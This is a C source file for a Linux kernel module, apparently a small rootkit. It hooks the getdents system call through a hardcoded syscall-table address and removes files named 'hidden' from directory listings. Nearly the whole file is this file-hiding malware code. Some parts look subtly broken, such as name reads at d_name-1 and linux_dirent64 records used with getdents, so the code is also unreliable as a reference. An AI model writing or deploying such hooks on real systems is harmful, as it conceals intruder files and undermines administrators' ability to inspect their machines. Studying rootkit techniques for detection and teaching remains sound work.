#include <linux/module.h> 
#include <linux/kernel.h> 
#include <asm/unistd.h> 
#include <asm/fcntl.h> 
#include <asm/errno.h> 
#include <linux/types.h> 
#include <linux/dirent.h> 
#include <linux/string.h> 
#include <linux/fs.h> 
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/highmem.h>
#include <asm/unistd.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include "rw.h"
#include "syscall.h"
MODULE_LICENSE("GPL");

//char* arg;
//module_param(arg, charp, 0);


int (*orig_syscall)(int fd, char* buf, int BUF_SIZE); /*the original systemcall*/
const unsigned long** sys_call_table = (const unsigned long**)0xffffffff81801460;

void hidename(char* buf, int* nread, char* name, int BUF_SIZE) {
	int i;
	struct linux_dirent64* dirent;
	char* tempbuf;
	int tempnread;
	i = 0;
	tempbuf = kmalloc(BUF_SIZE, GFP_KERNEL);
	tempnread = 0;


	while (i < *nread) {
		dirent = (struct linux_dirent64*) (buf + i);
		printk("%s\n", dirent->d_name-1);
		if (!strcmp(dirent->d_name-1, name)) {
			printk("###hiding###\n");

		}
		else {
			memcpy(tempbuf + tempnread, dirent, dirent->d_reclen);
			tempnread += dirent->d_reclen;
		}
		i += dirent->d_reclen;
	}
	memcpy(buf, tempbuf, *nread);
	*nread = tempnread;
	kfree(tempbuf);
}

//concatenate two strings together
//user is responsible for kfreeing returned memory
char* concat(char* left, char* right) {
	int leftlen = strlen(left);
	int rightlen = strlen(right);
	char* full = kmalloc(leftlen+rightlen+1, GFP_KERNEL);
	strcpy(full, left);
	strcpy(full+leftlen, right);
	return full;
}

int replace_syscall(int fd, char* buf, int BUF_SIZE) {
	int nread;
	nread = orig_syscall(fd, buf, BUF_SIZE);
	if (nread <= 0) {
		return nread;
	}
	hidename(buf, &nread, "hidden", BUF_SIZE);
	return nread;
}

int init_module() {
	make_rw(sys_call_table);
	orig_syscall = sys_call_table[SYS_getdents];
	sys_call_table[SYS_getdents] = replace_syscall;
	printk(KERN_INFO "Module loaded\n");
	return 0;
}

void cleanup_module() {
	sys_call_table[SYS_getdents] = orig_syscall;
	printk(KERN_INFO "Module unloaded\n");
}
